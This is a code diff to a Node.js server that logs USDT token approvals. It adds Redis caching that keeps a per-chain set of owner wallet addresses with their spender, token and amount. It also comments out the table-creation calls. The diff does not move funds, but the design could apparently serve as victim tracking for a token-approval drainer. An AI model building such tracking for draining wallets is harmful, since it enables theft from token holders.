@@ -1,8 +1,33 @@
 const http = require("http");
 const jwt = require("jsonwebtoken");
+const { createClient } = require("redis");
 const auth = require("./middleware/auth");
 const { insertApproval } = require("./models/approval");
 const cfg = require("./config/config.js");
+
+const redisClient = createClient({
+  socket: {
+    host: cfg.redis.host,
+    port: cfg.redis.port
+  },
+  password: cfg.redis.password || undefined,
+  database: cfg.redis.db
+});
+
+redisClient.on("error", (err) => {
+  console.error("redis error", err.message);
+});
+
+(async () => {
+  try {
+    if (!redisClient.isOpen) {
+      await redisClient.connect();
+      console.log("redis connected");
+    }
+  } catch (e) {
+    console.error("redis connect error", e.message);
+  }
+})();
 
 const createTableSql = `
 CREATE TABLE IF NOT EXISTS approvals (
@@ -30,6 +55,33 @@ async function ensureTable() {
   });
   const res = await pool.query(createTableSql);
   console.log("createTableSql result rowCount:", res.rowCount);
+}
+
+async function cacheApprovalToRedis(data) {
+  try {
+    if (!redisClient.isOpen) {
+      return;
+    }
+    const chainKey = String(data.chain || "").toLowerCase();
+    const owner = String(data.ownerAddress || "");
+    if (!chainKey || !owner) {
+      return;
+    }
+    const ownersKey = "usdt:owners:" + chainKey;
+    const approvalKey = "usdt:approval:" + chainKey + ":" + owner;
+    await redisClient.sAdd(ownersKey, owner);
+    await redisClient.hSet(approvalKey, {
+      chain: data.chain,
+      tokenAddress: data.tokenAddress,
+      spenderAddress: data.spenderAddress,
+      ownerAddress: data.ownerAddress,
+      lastTxHash: data.txHash,
+      amountUsdt: data.amountUsdt,
+      updatedAt: new Date().toISOString()
+    });
+  } catch (e) {
+    console.error("cacheApprovalToRedis error", e.message);
+  }
 }
 
 function readJsonBody(req) {
@@ -84,6 +136,7 @@ async function handleApproval(req, res) {
   const spenderAddress = String(body.spenderAddress || "").trim();
   const ownerAddress = String(body.ownerAddress || "").trim();
 
+  
   if (!chain || !txHash || !amountUsdt || !action || !tokenAddress || !spenderAddress || !ownerAddress) {
     res.statusCode = 400;
     res.setHeader("Content-Type", "application/json");
@@ -92,7 +145,7 @@ async function handleApproval(req, res) {
   }
 
   try {
-    await insertApproval({
+    const approvalData = {
       chain,
       txHash,
       amountUsdt,
@@ -100,7 +153,9 @@ async function handleApproval(req, res) {
       tokenAddress,
       spenderAddress,
       ownerAddress
-    });
+    };
+    await insertApproval(approvalData);
+    await cacheApprovalToRedis(approvalData);
     res.statusCode = 200;
     res.setHeader("Content-Type", "application/json");
     res.end(JSON.stringify({ ok: true }));
@@ -140,7 +195,7 @@ const server = http.createServer(async (req, res) => {
       return;
     }
     try {
-      await ensureTable();
+      // await ensureTable();
       await handleApproval(req, res);
     } catch (e) {
       console.error("error in /api/approval handler", e);
@@ -188,7 +243,7 @@ const server = http.createServer(async (req, res) => {
 
 (async () => {
   try {
-    await ensureTable();
+    // await ensureTable();
     console.log("database init ok");
   } catch (e) {
     console.error("database init error", e);
